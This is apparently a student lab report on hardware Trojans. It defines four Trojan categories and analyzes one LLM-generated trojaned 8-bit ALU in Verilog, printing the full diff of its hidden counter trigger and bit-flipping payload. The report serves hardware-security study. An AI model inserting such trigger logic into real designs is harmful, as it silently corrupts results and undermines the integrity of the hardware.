# Task 1. Taxonomy + safety 

## Locate the Vulnerability Definitions
Identify the four Trojan categories (T1–T4) used in this lab. 
These are defined in the `GHOST_Trojan_GPT.py` script and referenced in the `Hardware_Trojan_Insertion_Lab.ipynb` notebook.
- T1: Change Functionality: Subtly alter logic to produce incorrect results under specific conditions.
- T2: Leak Information: Design a covert data transmission mechanism that activates upon detecting a specific signal pattern.
- T3: Denial of Service: Introduce a condition that temporarily disables the module, triggered by a rare sequence of events.
- T4: Performance Degradation: Implement a continuously running shift register or accumulator to increase power consumption without affecting primary functionality.

## Taxonomy Summary
### T1: Change Functionality
Changes the intended behavior of the hardware so it produces wrong outputs, but only
when a particular condition is met. In hardware security terms, it is dangerous
because the design appears normal most of the time, which makes the malicious logic
harder to notice during ordinary testing.
#### Example:
An arithmetic module behaves normally for almost all inputs, but when it receives a rare
combination of operands, it flips one bit of the result, so the output is slightly wrong.

### T2: Leak Information
Designed to covertly expose internal data by encoding or transmitting it when a specific
trigger pattern occurs. Its main security risk is that it can quietly
turn the circuit into a hidden communication channel without visibly breaking the
primary function of the module.
#### Example:
A crypto-related module works correctly, but after a hidden trigger sequence appears on
its inputs, it starts modulating an otherwise unimportant output signal so that secret
internal data can be inferred over time.

### T3: Denial of Service
Temporarily or permanently prevents the module from operating correctly after a trigger.
From a hardware security perspective, the goal is not to corrupt outputs directly, 
but to disrupt availability and make the system unreliable or unresponsive at selected times.
#### Example:
A controller runs normally until it observes a rare sequence of control states, after
which it forces itself into a stall condition for several cycles and stops responding
to valid inputs.

### T4: Performance Degradation
Adds extra activity, such as a continuously running shift register or
accumulator, that does not change the functional outputs but wastes power or hardware
resources. It is a subtle form of attack because the circuit still appears correct
functionally, while efficiency, power use, or long-term reliability is degraded.
#### Example:
Extra hidden logic continuously toggles internal registers every clock cycle even though
those registers do not affect the module’s real outputs.

## Step 3: Define and Document Your Safety Rule
### "We will never commit API keys or secrets (such as those in the .secrets/ folder) to any public or private repository."

The `./.secrets/` directory was created and all of its contents have been added to the `.gitignore` file.

# Task 2. Single-sample analysis
For this part, we chose to look at `demo_designs/alu_simple.v` and `trojaned_outputs/gpt-5-nano/alu_simple/alu_simple_HT1_gpt-5-nano_A1.v` for the individual analysis.
To start, I opened the two files in a text comparer. The biggest standout was that the non-trojaned code had 3 inputs (a, b, and op) and one output (result). The trojaned code had those inputs and output but also added two new inputs clk (clock) and reset, this started to indicate how the trojan was triggered. There were also three variables outside the input/output variables that stored the regular results, cycle count, and whether or not the trojan was active.
## Suspected trigger condition
The intial trigger code is commented so we can see where it is:
```verilog
always @(posedge clk or posedge reset) begin
    if (reset) begin
        cycle_cnt <= 16'b0;
        trojan_active <= 1'b0;
    end else begin
        cycle_cnt <= cycle_cnt + 16'b1;
        // Activation window: brief period starting at a fixed counter value
        if (cycle_cnt == 16'h0F0F)
            trojan_active <= 1'b1;
        else if (cycle_cnt == 16'h0F1F)
            trojan_active <= 1'b0;
    end
end
```
Here we can see that the trojan active is set to 1 only if reset is false and the cycle count is equal to 16'h0F0F which translates to 3855 and then turns off at 16'h0F1F or 3871 meaning it's only active for 16 clock cycles. The total clock cycles is 65535 so 3855 is pretty early on in the timeline but is late enough that it's not instantly caught.
Once the trojan is activated, the trojan_active variable becomes 1. The relevant code for its effect can be found below:
```verilog
wire trojan_condition = trojan_active &&
                        (a == 8'hA5) &&
                        (b == 8'h5A) &&
                        (op == 3'b000);
```
This shows that the time is not the only trigger for the trojan. While the trojan is active during the cycle window, if 0xA5 and 0x5A are added together (opcode 0 is addition), then the trojan condition becomes true. Wires are special in verilog. They are constantly recomputed each time the variables change, meaning that only while these specific conditions are true is the condition activated. They also don't rely on variables so no "trojan_condition" variable is actively stored, making it more difficult to detect.
## Payload effect
The payload effect is twofold. First, it xors the normal result by 0x02. Then it returns that result instead of the normal result if the trojan condition is enabled. This can be seen here:
```verilog
wire [7:0] trojan_payload = normal_result ^ 8'h02;
always @(*) begin
    if (trojan_condition)
        result = trojan_payload;
    else
        result = normal_result;
end
```
Unlike what we've seen in class, this trojan focuses on corruption and compromising integrity rather than leaking secrets like keys. 
## Where the RTL was modified
The added code and variables were shown throughout the parts above with analysis. The biggest takeaway is that there's no need for a simple ALU to need to keep track of clock cycles so looking into why it was recording them allowed me to understand how the code works and how the trojan is activated while staying concealed. Here's a diff showing the lines that changed vs. the ones that remained the same:
```diff
module alu_simple(
-    input [7:0] a, b,
+    input clk,
+    input reset,
+    input [7:0] a,
+    input [7:0] b,
     input [2:0] op,
     output reg [7:0] result
);

- always @(*) begin
-     case(op)
-         3'b000: result = a + b;
-         3'b001: result = a - b;
-         3'b010: result = a & b;
-         3'b011: result = a | b;
-         default: result = 8'b0;
-     endcase
- end
+    reg [7:0] normal_result;
+    reg [15:0] cycle_cnt;
+    reg trojan_active;
+
+    always @(*) begin
+        case (op)
+            3'b000: normal_result = a + b;
+            3'b001: normal_result = a - b;
+            3'b010: normal_result = a & b;
+            3'b011: normal_result = a | b;
+            default: normal_result = 8'b0;
+        endcase
+    end
+
+    always @(posedge clk or posedge reset) begin
+        if (reset) begin
+            cycle_cnt <= 16'b0;
+            trojan_active <= 1'b0;
+        end else begin
+            cycle_cnt <= cycle_cnt + 16'b1;
+            if (cycle_cnt == 16'h0F0F)
+                trojan_active <= 1'b1;
+            else if (cycle_cnt == 16'h0F1F)
+                trojan_active <= 1'b0;
+        end
+    end
+
+    wire trojan_condition = trojan_active &&
+                            (a == 8'hA5) &&
+                            (b == 8'h5A) &&
+                            (op == 3'b000);
+
+    wire [7:0] trojan_payload = normal_result ^ 8'h02;
+
+    always @(*) begin
+        if (trojan_condition)
+            result = trojan_payload;
+        else
+            result = normal_result;
+    end

endmodule
```

# Task 3. Cross-sample comparison

# Task 4. Validation & testing
